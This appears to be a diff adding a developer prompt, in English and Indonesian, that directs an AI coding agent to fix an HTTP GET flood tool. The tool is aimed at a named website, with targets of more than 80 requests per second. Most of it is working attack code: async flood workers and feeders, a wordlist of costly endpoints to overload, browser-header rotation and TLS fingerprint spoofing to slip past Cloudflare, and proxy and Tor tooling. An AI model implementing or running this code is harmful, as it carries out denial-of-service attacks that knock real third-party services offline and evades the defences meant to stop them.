@@ -1,0 +1,831 @@
+============================================================
+DEVELOPER PROMPT — CRITICAL FIX v1.2
+REQUEST ACCOUNTING + ASYNC THROUGHPUT + RECON RESILIENCE
+============================================================
+
+ROLE
+-----------------------------------------------------------
+Senior Python Async Engineer. Zero tolerance for swallowed
+exceptions, fake metrics, or blocking I/O in async paths.
+Windows + Linux compatible. Python 3.12+ only.
+
+TARGET BEHAVIOR
+-----------------------------------------------------------
+python main.py --phase attack --target sobremesanm.com \
+  --vector http_get_flood --duration 10 --threads 50
+
+MUST produce:
+  Attempted: 800+
+  Completed: 600+
+  Failed: 100+
+  Timeout: 50+
+  Cancelled: 50+
+  RPS: >80
+  Avg Latency: <3000ms
+
+Current broken output:
+  Attempted=18, Completed=5, Failed=0, RPS=0.67
+  13 requests UNACCOUNTED = CRITICAL BUG
+
+============================================================
+FIX-01: CLOSED-LOOP REQUEST ACCOUNTING
+============================================================
+
+Problem: Attempted != Completed + Failed + Timeout + Cancelled
+13 requests disappeared into void.
+
+Solution: Every request MUST pass through EXACTLY ONE exit gate.
+
+Implement in src/core/metrics.py:
+
+class AttackMetrics:
+    def __init__(self):
+        self.attempted = 0
+        self.completed = 0
+        self.failed = 0
+        self.timeout = 0
+        self.cancelled = 0
+        self._lock = asyncio.Lock()
+    
+    async def record_attempt(self):
+        async with self._lock:
+            self.attempted += 1
+    
+    async def record_complete(self, status: int, latency_ms: float):
+        async with self._lock:
+            self.completed += 1
+    
+    async def record_fail(self, error_type: str):
+        async with self._lock:
+            self.failed += 1
+    
+    async def record_timeout(self):
+        async with self._lock:
+            self.timeout += 1
+    
+    async def record_cancelled(self):
+        async with self._lock:
+            self.cancelled += 1
+    
+    def validate(self) -> bool:
+        total = self.completed + self.failed + self.timeout + self.cancelled
+        if self.attempted != total:
+            # CRITICAL: Log mismatch with full detail
+            print(f"[CRITICAL] ACCOUNTING MISMATCH: Attempted={self.attempted}, Accounted={total}")
+            print(f"  Missing={self.attempted - total}")
+            return False
+        return True
+
+Worker pattern (MANDATORY):
+
+async def worker(session, url, metrics, stop_event):
+    await metrics.record_attempt()
+    task_start = time.monotonic()
+    
+    try:
+        async with asyncio.timeout(5):  # Python 3.11+
+            async with session.get(url) as resp:
+                latency = (time.monotonic() - task_start) * 1000
+                await metrics.record_complete(resp.status, latency)
+                return resp.status
+                
+    except asyncio.TimeoutError:
+        await metrics.record_timeout()
+        return "TIMEOUT"
+        
+    except asyncio.CancelledError:
+        await metrics.record_cancelled()
+        raise  # Re-raise, do not swallow
+        
+    except aiohttp.ClientError as e:
+        await metrics.record_fail(f"ClientError:{type(e).__name__}")
+        return f"FAIL:{type(e).__name__}"
+        
+    except Exception as e:
+        await metrics.record_fail(f"UNEXPECTED:{type(e).__name__}")
+        # Log full traceback
+        traceback.print_exc()
+        raise  # Re-raise unknown errors
+
+Main loop pattern (MANDATORY):
+
+async def run_attack(url, duration_sec, threads):
+    connector = aiohttp.TCPConnector(
+        limit=threads * 2,
+        limit_per_host=threads,
+        ttl_dns_cache=300,
+        use_dns_cache=True,
+        enable_cleanup_closed=True,
+        force_close=False
+    )
+    
+    timeout = aiohttp.ClientTimeout(total=10, connect=5)
+    
+    async with aiohttp.ClientSession(
+        connector=connector,
+        timeout=timeout,
+        headers=get_headers()
+    ) as session:
+        
+        metrics = AttackMetrics()
+        stop_event = asyncio.Event()
+        
+        tasks = [
+            asyncio.create_task(worker(session, url, metrics, stop_event))
+            for _ in range(threads)
+        ]
+        
+        # Background feeder: recreate tasks as they complete
+        feeder_task = asyncio.create_task(
+            feeder_loop(session, url, metrics, stop_event, tasks)
+        )
+        
+        await asyncio.sleep(duration_sec)
+        stop_event.set()
+        
+        # Cancel all pending
+        for t in tasks:
+            if not t.done():
+                t.cancel()
+        
+        # Wait with timeout for cleanup
+        await asyncio.wait(tasks, timeout=5)
+        
+        # Validate accounting
+        if not metrics.validate():
+            print("[CRITICAL] Metrics validation FAILED")
+        
+        return metrics.get_summary()
+
+async def feeder_loop(session, url, metrics, stop_event, task_list):
+    """Replace completed tasks with new ones until stop_event."""
+    while not stop_event.is_set():
+        done, pending = await asyncio.wait(
+            task_list, 
+            return_when=asyncio.FIRST_COMPLETED,
+            timeout=1
+        )
+        for t in done:
+            try:
+                result = t.result()
+            except asyncio.CancelledError:
+                pass
+            except Exception:
+                traceback.print_exc()
+            
+            task_list.remove(t)
+            if not stop_event.is_set():
+                new_task = asyncio.create_task(
+                    worker(session, url, metrics, stop_event)
+                )
+                task_list.append(new_task)
+        
+        await asyncio.sleep(0.001)  # Yield control
+
+============================================================
+FIX-02: ASYNC THROUGHPUT — SESSION REUSE & CONNECTION POOL
+============================================================
+
+Problem: 20 threads = 0.67 RPS. Should be 80+ RPS minimum.
+Root cause: curl_cffi.AsyncSession may be blocking on Windows,
+or session is recreated per request.
+
+Solution: Benchmark + fallback architecture.
+
+Implement in src/vectors/l7_application/http_get_flood.py:
+
+BENCHMARK FUNCTION (run once at module load):
+
+async def benchmark_backend(url: str, duration: int = 3) -> dict:
+    """Test aiohttp vs curl_cffi raw throughput."""
+    results = {}
+    
+    # Test 1: aiohttp with connection reuse
+    connector = aiohttp.TCPConnector(limit=100, limit_per_host=50)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        start = time.monotonic()
+        count = 0
+        while time.monotonic() - start < duration:
+            try:
+                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)):
+                    count += 1
+            except Exception:
+                pass
+        results["aiohttp"] = count / duration
+    
+    # Test 2: curl_cffi (if available)
+    try:
+        from curl_cffi import requests as curl_req
+        session = curl_req.AsyncSession(impersonate="chrome120", timeout=5)
+        start = time.monotonic()
+        count = 0
+        while time.monotonic() - start < duration:
+            try:
+                await session.get(url)
+                count += 1
+            except Exception:
+                pass
+        await session.close()
+        results["curl_cffi"] = count / duration
+    except Exception as e:
+        results["curl_cffi"] = f"FAILED: {e}"
+    
+    print(f"[BENCHMARK] aiohttp={results.get('aiohttp',0):.1f} RPS, curl_cffi={results.get('curl_cffi',0) if isinstance(results.get('curl_cffi'), (int,float)) else results.get('curl_cffi')} RPS")
+    return results
+
+AUTO-SELECT BACKEND:
+
+def select_backend(benchmark_results: dict) -> str:
+    aio_rps = benchmark_results.get("aiohttp", 0)
+    curl_rps = benchmark_results.get("curl_cffi", 0)
+    
+    if isinstance(curl_rps, (int, float)) and curl_rps > aio_rps * 0.8:
+        return "curl_cffi"  # Use if not significantly slower
+    return "aiohttp"  # Default: aiohttp is proven fast on Windows
+
+SESSION MANAGER (per-backend):
+
+class SessionManager:
+    def __init__(self, backend: str, threads: int, ja3_profile: str = "chrome120"):
+        self.backend = backend
+        self.threads = threads
+        self.ja3_profile = ja3_profile
+        self._session = None
+        self._connector = None
+    
+    async def __aenter__(self):
+        if self.backend == "curl_cffi":
+            from curl_cffi import requests as curl_req
+            self._session = curl_req.AsyncSession(
+                impersonate=self.ja3_profile,
+                timeout=10
+            )
+        else:
+            self._connector = aiohttp.TCPConnector(
+                limit=self.threads * 2,
+                limit_per_host=self.threads,
+                ttl_dns_cache=300,
+                use_dns_cache=True,
+                enable_cleanup_closed=True,
+                force_close=False
+            )
+            self._session = aiohttp.ClientSession(
+                connector=self._connector,
+                timeout=aiohttp.ClientTimeout(total=10, connect=5)
+            )
+        return self._session
+    
+    async def __aexit__(self, exc_type, exc, tb):
+        if self.backend == "curl_cffi":
+            await self._session.close()
+        else:
+            await self._session.close()
+            if self._connector:
+                await self._connector.close()
+
+CRITICAL: curl_cffi on Windows
+- curl_cffi uses libcurl DLL which may block the event loop
+- If benchmark shows curl_cffi < 5 RPS on Windows, FORCE fallback to aiohttp
+- JA3 spoofing is secondary to throughput — a slow "stealth" request that sends 0.5 RPS is useless
+
+============================================================
+FIX-03: RECON RESILIENCE — FALLBACK ENDPOINT DISCOVERY
+============================================================
+
+Problem: Crawling fails with ConnectionResetError. Only 1 endpoint found.
+Cloudflare blocks recon crawling. Selector has no choices.
+
+Solution: Multi-source endpoint discovery with graceful degradation.
+
+Implement in src/core/ai/endpoint_selector.py:
+
+FALLBACK_ENDPOINT_WORDLIST (embed in code, no external file needed):
+
+DEFAULT_ENDPOINTS = [
+    # High-cost dynamic endpoints
+    "/search", "/search?q=test", "/search?q=a&page=1",
+    "/api/search", "/api/v1/search",
+    "/filter", "/sort", "/category",
+    "/products", "/product/1", "/item/1",
+    "/cart", "/checkout", "/cart/add",
+    "/login", "/register", "/auth", "/oauth",
+    "/contact", "/form", "/submit",
+    "/export", "/download", "/report", "/generate",
+    "/api/graphql", "/graphql", "/gql",
+    "/api/rest", "/api/v1/users", "/api/v1/data",
+    "/wp-json/wp/v2/posts", "/wp-json/wp/v2/users",
+    "/admin", "/panel", "/dashboard", "/backend",
+    "/ajax", "/xhr", "/fetch", "/load",
+    "/news", "/blog", "/article/1", "/post/1",
+    "/page/1", "/category/tech", "/tag/test",
+    # Static but useful for baseline
+    "/", "/index.html", "/home", "/main"
+]
+
+MULTI-SOURCE DISCOVERY:
+
+class EndpointDiscovery:
+    def __init__(self, domain: str, recon_json_path: str):
+        self.domain = domain
+        self.recon_json_path = recon_json_path
+        self.endpoints = []
+    
+    async def discover(self) -> list[dict]:
+        """Try multiple sources in order of preference."""
+        
+        # Source 1: Existing recon JSON (fastest, no network)
+        endpoints = self._from_recon_json()
+        if len(endpoints) >= 5:
+            return endpoints
+        
+        # Source 2: Sitemap / robots.txt (lightweight)
+        sitemap_eps = await self._from_sitemap()
+        endpoints.extend(sitemap_eps)
+        if len(endpoints) >= 5:
+            return endpoints
+        
+        # Source 3: Fallback wordlist (guaranteed)
+        fallback_eps = self._from_wordlist()
+        endpoints.extend(fallback_eps)
+        
+        # Deduplicate
+        seen = set()
+        unique = []
+        for ep in endpoints:
+            key = ep.get("url", "")
+            if key not in seen:
+                seen.add(key)
+                unique.append(ep)
+        
+        return unique
+    
+    def _from_recon_json(self) -> list[dict]:
+        """Parse existing Phase 1 recon output."""
+        try:
+            with open(self.recon_json_path, 'r') as f:
+                recon = json.load(f)
+            
+            endpoints = []
+            
+            # Extract from subdomain enumeration
+            subs = recon.get("subdomain_enumeration", {}).get("found", [])
+            for sub in subs:
+                if isinstance(sub, dict) and "name" in sub:
+                    endpoints.append({
+                        "url": f"https://{sub['name']}",
+                        "source": "recon_subdomain",
+                        "score": 5.0
+                    })
+            
+            # Extract from technology stack (API hints)
+            tech = recon.get("technology_stack", {})
+            if tech.get("backend_framework") in ["WordPress", "Laravel", "Django"]:
+                endpoints.append({
+                    "url": f"https://{self.domain}/wp-json/wp/v2/posts",
+                    "source": "recon_tech",
+                    "score": 8.0
+                })
+            
+            # Extract from HTTP headers (API endpoints)
+            headers = recon.get("http_headers_analysis", {}).get("headers", {})
+            if "x-powered-by" in headers:
+                endpoints.append({
+                    "url": f"https://{self.domain}/api",
+                    "source": "recon_header",
+                    "score": 6.0
+                })
+            
+            return endpoints
+            
+        except Exception as e:
+            print(f"[-] Recon JSON parse failed: {e}")
+            return []
+    
+    async def _from_sitemap(self) -> list[dict]:
+        """Fetch sitemap.xml and robots.txt with stealth headers."""
+        urls = [
+            f"https://{self.domain}/sitemap.xml",
+            f"https://{self.domain}/robots.txt",
+            f"https://{self.domain}/sitemap_index.xml"
+        ]
+        
+        endpoints = []
+        connector = aiohttp.TCPConnector(limit=3, ttl_dns_cache=300)
+        
+        async with aiohttp.ClientSession(
+            connector=connector,
+            headers={
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Accept-Encoding": "gzip, deflate, br",
+                "DNT": "1",
+                "Connection": "keep-alive",
+            }
+        ) as session:
+            for url in urls:
+                try:
+                    async with asyncio.timeout(5):
+                        async with session.get(url) as resp:
+                            if resp.status == 200:
+                                text = await resp.text()
+                                # Parse URLs from sitemap/robots
+                                found = re.findall(r'https?://[^\\s<>\"\\']+', text)
+                                for u in found[:20]:  # Limit
+                                    if self.domain in u:
+                                        endpoints.append({
+                                            "url": u,
+                                            "source": "sitemap",
+                                            "score": 4.0
+                                        })
+                except Exception:
+                    pass
+        
+        return endpoints
+    
+    def _from_wordlist(self) -> list[dict]:
+        """Guaranteed fallback — always returns endpoints."""
+        endpoints = []
+        for path in DEFAULT_ENDPOINTS:
+            endpoints.append({
+                "url": f"https://{self.domain}{path}",
+                "source": "fallback_wordlist",
+                "score": 3.0
+            })
+        return endpoints
+
+CRITICAL: When crawling fails with ConnectionResetError, the system
+MUST NOT crash. It must silently fall back to next source and print:
+  "[-] Crawling blocked by WAF. Falling back to recon JSON..."
+  "[-] Recon JSON insufficient. Falling back to sitemap..."
+  "[-] Sitemap blocked. Falling back to wordlist (guaranteed)."
+
+============================================================
+FIX-04: RECON CRAWLING WITH STEALTH
+============================================================
+
+Problem: Cloudflare resets connection during recon crawling.
+User-Agent and TLS pattern detected as bot.
+
+Solution: Apply same stealth to recon as attack.
+
+Implement in src/reconnaissance/tech_stack.py or crawler module:
+
+STEALTH_HEADERS_ROTATION:
+
+STEALTH_PROFILES = [
+    {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        "DNT": "1",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-User": "?1",
+        "Cache-Control": "max-age=0",
+    },
+    {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+    },
+    {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Accept-Encoding": "gzip, deflate, br",
+        "DNT": "1",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-User": "?1",
+    }
+]
+
+CRAWL_DELAY:
+- Random delay between requests: uniform(1.5, 4.0) seconds
+- Max concurrent crawl connections: 2
+- Use aiohttp with DNS cache, connection reuse
+- Rotate profile every 3 requests
+
+============================================================
+BAHAN INSTALL 2026 — POWERFULL TERBANYAK (READY TO USE)
+============================================================
+
+Semua library di bawah ini sudah tersedia di PyPI / GitHub / Cargo 
+tahun 2026. Tidak perlu build dari source (kecuali disebutkan).
+
+PYTHON — PIP INSTALL (paling banyak & powerful):
+
+# Core Async & HTTP (WAJIB)
+aiohttp>=3.9.0              # Async HTTP client/server, connection pooling
+aiohttp-socks>=0.8.0        # SOCKS proxy untuk aiohttp
+httpx[http2]>=0.27.0        # HTTP/2 + HTTP/3 support, sync+async
+httpx-socks>=0.9.0          # SOCKS proxy untuk httpx
+websockets>=12.0            # WebSocket client/server
+curl-cffi>=0.6.0            # JA3/JA4 TLS fingerprint spoofing (Windows/Linux)
+
+# DNS & Network
+aiodns>=3.1.0               # Async DNS (c-ares)
+dnspython>=2.6.0            # DNS toolkit
+python-whois>=0.8.0         # WHOIS queries
+ipwhois>=1.2.0              # IP WHOIS / ASN lookup
+netaddr>=0.9.0              # IP address manipulation
+
+# TLS / SSL / Crypto
+cryptography>=42.0.0        # OpenSSL wrapper
+pyOpenSSL>=24.0.0           # OpenSSL high-level
+certifi>=2024.2.2           # CA bundle
+service-identity>=24.1.0    # TLS identity verification
+scrapli[asyncio]>=2024.1.1  # Async SSH/Telnet (untuk cPanel chain)
+
+# Data & Parsing
+orjson>=3.9.0               # Fastest JSON (Rust backend)
+ujson>=5.9.0                # UltraJSON fallback
+beautifulsoup4>=4.12.0      # HTML parsing
+lxml>=5.1.0                 # XML/HTML parsing (C backend, fastest)
+html5lib>=1.1.0             # HTML5 parser (fallback)
+cssselect>=1.2.0            # CSS selector untuk lxml/bs4
+
+# Intelligence & Recon
+shodan>=1.31.0              # Shodan API
+censys>=2.2.0               # Censys API
+python-masscan>=1.0.0       # Python wrapper masscan
+python-nmap>=0.7.1          # Nmap wrapper (kalau nmap terinstall)
+
+# Browser Automation
+playwright>=1.42.0          # Headless Chrome/Firefox/WebKit
+selenium>=4.18.0            # Selenium WebDriver
+undetected-chromedriver>=3.5.0  # Chrome driver anti-deteksi
+selenium-stealth>=1.0.6     # Stealth plugin untuk Selenium
+
+# ML / AI (untuk Behavioral Learning & Adaptive)
+torch>=2.2.0                # PyTorch
+transformers>=4.38.0        # HuggingFace Transformers
+scikit-learn>=1.4.0         # ML classical (Markov, clustering)
+scipy>=1.12.0               # Scientific computing
+numpy>=1.26.0               # Numerical arrays
+pandas>=2.2.0               # Data frames
+gymnasium>=0.29.0           # RL environment
+stable-baselines3>=2.3.0    # RL algorithms (PPO, DQN)
+
+# Config & Validation
+pydantic>=2.6.0             # Data validation
+pydantic-settings>=2.1.0    # Environment config
+python-dotenv>=1.0.0        # .env file loader
+PyYAML>=6.0.1               # YAML parser
+toml>=0.10.2                # TOML parser
+
+# Database & Cache
+aiosqlite>=0.20.0           # Async SQLite
+sqlalchemy>=2.0.0           # SQL ORM
+alembic>=1.13.0             # DB migrations
+redis>=5.0.0                # Redis client (sync+async)
+motor>=3.3.0                # Async MongoDB driver
+
+# Logging & Metrics
+python-json-logger>=2.0.7   # JSON structured logging
+prometheus-client>=0.20.0   # Prometheus metrics
+statsd>=4.0.0               # StatsD client
+
+# Utilities
+fake-useragent>=1.5.0       # Realistic UA rotation
+user-agents>=2.2.0          # UA parsing
+Faker>=23.0.0               # Fake data generator
+tenacity>=8.2.0             # Retry decorator
+backoff>=2.2.0              # Exponential backoff
+python-socks>=2.4.0         # SOCKS proxy
+requests>=2.31.0            # Sync HTTP fallback
+urllib3>=2.2.0              # HTTP client core
+charset-normalizer>=3.3.0   # Encoding detection
+idna>=3.6.0                 # Internationalized domain names
+
+GO — GO GET (High Performance):
+
+# HTTP & Networking
+github.com/valyala/fasthttp              # Fastest HTTP client Go
+github.com/valyala/fasthttp/fasthttputil # HTTP utilities
+golang.org/x/net/http2                   # HTTP/2 official
+github.com/quic-go/quic-go               # HTTP/3 / QUIC
+github.com/gorilla/websocket             # WebSocket
+github.com/gobwas/ws                     # Lightweight WebSocket
+github.com/imroc/req/v3                  # Powerful HTTP client (curl-like)
+
+# TLS & Security
+github.com/refraction-networking/utls    # JA3/JA4 TLS spoofing
+github.com/curl-impersonate/curl-impersonate  # Curl impersonate
+golang.org/x/crypto                      # Crypto extensions
+
+# Packet & Low Level
+github.com/google/gopacket               # Packet crafting
+github.com/google/gopacket/pcap          # PCAP capture
+github.com/pires/go-proxyproto           # PROXY protocol
+
+# Async & Concurrency
+github.com/panjf2000/gnet/v2             # High-performance event-driven
+github.com/tidwall/evio                  # Fast event loop
+github.com/cloudwego/netpoll             # Netpoll (ByteDance)
+
+# Browser
+github.com/chromedp/chromedp             # Headless Chrome DevTools
+github.com/go-rod/rod                    # Browser automation
+github.com/playwright-community/playwright-go  # Playwright Go
+
+# Config & Data
+github.com/spf13/viper                   # Config management
+github.com/knadh/koanf                   # Lightweight config
+github.com/pelletier/go-toml/v2          # TOML
+github.com/tidwall/gjson                 # JSON path queries
+github.com/tidwall/sjson                 # JSON modification
+github.com/buger/jsonparser              # Fast JSON parser
+
+# Database & Cache
+github.com/redis/go-redis/v9             # Redis
+github.com/jackc/pgx/v5                  # PostgreSQL
+github.com/go-sql-driver/mysql           # MySQL
+github.com/mattn/go-sqlite3              # SQLite (CGO)
+
+# Metrics & Logging
+github.com/prometheus/client_golang        # Prometheus
+github.com/sirupsen/logrus               # Structured logging
+github.com/rs/zerolog                    # Zero-allocation logging
+github.com/uber-go/zap                   # High-performance logging
+
+# Utilities
+github.com/google/uuid                   # UUID
+github.com/oklog/ulid/v2                 # ULID
+github.com/joho/godotenv                 # .env loader
+
+RUST — CARGO ADD (Low Level & Speed):
+
+# Async Runtime
+tokio>=1.36.0               # Async runtime
+tokio-util>=0.7.0           # Tokio utilities
+
+# HTTP
+hyper>=1.2.0                # HTTP client/server
+hyper-util>=0.1.0           # Hyper utilities
+h2>=0.4.0                   # HTTP/2
+reqwest>=0.11.0             # HTTP client (async)
+tokio-tungstenite>=0.21.0   # WebSocket
+
+# Packet / Network
+pnet>=0.34.0                # Packet networking
+libpnet>=0.34.0             # Packet (alias)
+quinn>=0.10.0               # QUIC
+
+# Serialization
+serde>=1.0.0                # Serialization framework
+serde_json>=1.0.0           # JSON
+serde_yaml>=0.9.0           # YAML
+toml>=0.8.0                 # TOML
+
+# Crypto & TLS
+rustls>=0.22.0              # TLS (Rust native)
+tokio-rustls>=0.25.0        # Async TLS
+webpki-roots>=0.26.0        # CA roots
+
+# Concurrency
+crossbeam>=0.8.0            # Concurrency primitives
+rayon>=1.9.0                # Data parallelism
+dashmap>=5.5.0              # Concurrent HashMap
+parking_lot>=0.12.0         # Fast synchronization
+
+# Logging & Metrics
+tracing>=0.1.0              # Structured logging
+tracing-subscriber>=0.3.0   # Log subscriber
+metrics>=0.22.0             # Metrics
+metrics-exporter-prometheus>=0.13.0
+
+# Utilities
+uuid>=1.7.0                 # UUID
+ulid>=1.1.0                 # ULID
+chrono>=0.4.0               # Date/time
+rand>=0.8.0                 # Random
+fastrand>=2.0.0             # Fast random
+
+DOCKER / INFRASTRUCTURE (Install via package manager):
+
+docker>=25.0.0              # Container engine
+docker-compose>=2.24.0    # Multi-container
+kubernetes>=1.29.0        # K8s (kubectl)
+helm>=3.14.0              # K8s package manager
+minikube>=1.32.0          # Local K8s
+terraform>=1.7.0          # IaC
+ansible>=9.0.0            # Config management
+vagrant>=2.4.0            # VM orchestration
+
+MONITORING:
+
+prometheus>=2.49.0          # Metrics collection
+grafana>=10.3.0             # Visualization
+elasticsearch>=8.12.0       # Log storage
+logstash>=8.12.0            # Log pipeline
+kibana>=8.12.0              # Log visualization
+jaeger>=1.53.0              # Distributed tracing
+loki>=2.9.0                 # Log aggregation (Grafana)
+promtail>=2.9.0             # Log shipper
+node_exporter>=1.7.0        # Host metrics
+cadvisor>=0.49.0            # Container metrics
+
+MESSAGE BROKERS:
+
+redis>=7.2.0                # In-memory store / queue
+rabbitmq>=3.13.0            # AMQP broker
+nats-server>=2.10.0         # NATS server
+apache-kafka>=3.6.0         # Kafka broker
+pulsar>=3.1.0               # Apache Pulsar
+
+VPN / TUNNEL / PROXY:
+
+wireguard-tools>=1.0.0      # WireGuard
+openvpn>=2.6.0              # OpenVPN
+tor>=0.4.8.0                # Tor daemon
+privoxy>=3.0.0              # HTTP proxy
+squid>=6.6.0                # Caching proxy
+haproxy>=2.9.0              # Load balancer / proxy
+nginx>=1.25.0               # Web server / proxy
+traefik>=2.11.0             # Cloud-native proxy
+
+============================================================
+INSTALLATION ONE-LINER
+============================================================
+
+# Python (semua sekaligus)
+pip install aiohttp aiohttp-socks httpx[http2] httpx-socks websockets curl-cffi \
+    aiodns dnspython python-whois ipwhois netaddr \
+    cryptography pyOpenSSL certifi service-identity scrapli[asyncio] \
+    orjson ujson beautifulsoup4 lxml html5lib cssselect \
+    shodan censys python-masscan python-nmap \
+    playwright selenium undetected-chromedriver selenium-stealth \
+    torch transformers scikit-learn scipy numpy pandas gymnasium stable-baselines3 \
+    pydantic pydantic-settings python-dotenv PyYAML toml \
+    aiosqlite sqlalchemy alembic redis motor \
+    python-json-logger prometheus-client statsd \
+    fake-useragent user-agents Faker tenacity backoff python-socks \
+    requests urllib3 charset-normalizer idna
+
+# Playwright browsers
+playwright install
+
+# Go (contoh beberapa yang paling penting)
+go get github.com/valyala/fasthttp
+go get github.com/refraction-networking/utls
+go get github.com/quic-go/quic-go
+go get github.com/chromedp/chromedp
+go get github.com/redis/go-redis/v9
+go get github.com/prometheus/client_golang
+
+# Rust (contoh)
+cargo add tokio hyper pnet serde serde_json rustls crossbeam rayon
+
+============================================================
+ACCEPTANCE CRITERIA (MUST PASS)
+================================================-----------
+
+[ ] 50 threads, 10 seconds → Attempted > 800, Completed > 600
+[ ] Metrics validate(): Attempted == Completed + Failed + Timeout + Cancelled
+[ ] Zero swallowed exceptions (all errors logged with traceback)
+[ ] CDN URLs filtered from target selection
+[ ] Recon fallback: if crawl fails → recon JSON → sitemap → wordlist
+[ ] curl_cffi benchmarked, fallback to aiohttp if < 5 RPS
+[ ] Health check runs before attack and reports real status
+[ ] No fake "Target is struggling" logs — only real metrics
+[ ] Windows compatible (no Unix-only libraries in core path)
+
+============================================================
+FILES TO CREATE / MODIFY
+============================================================
+
+CREATE:
+  src/core/metrics.py              # Closed-loop accounting
+  src/utils/url_validator.py       # CDN filter, static asset filter
+  src/core/ai/endpoint_discovery.py  # Multi-source discovery
+
+MODIFY:
+  src/vectors/l7_application/http_get_flood.py   # Benchmark + backend select
+  src/vectors/l7_application/http_post_flood.py  # Same pattern
+  src/core/ai/endpoint_selector.py               # Use EndpointDiscovery
+  src/core/ai/adaptive_controller.py             # Real metrics only
+  src/reconnaissance/tech_stack.py               # Stealth headers
+
+============================================================
+BEGIN IMPLEMENTATION — PRIORITY ORDER
+============================================================
+
+1. Create src/core/metrics.py (AttackMetrics with validate())
+2. Create src/utils/url_validator.py (CDN filter)
+3. Create src/core/ai/endpoint_discovery.py (fallback sources)
+4. Modify http_get_flood.py (benchmark + session manager + feeder loop)
+5. Modify endpoint_selector.py (use discovery + filter)
+6. Run test: 50 threads, 10 seconds, verify metrics
+7. If RPS < 80, debug backend and connector settings
+8. Only after ALL acceptance criteria pass → proceed to Fase 6
+
+============================================================
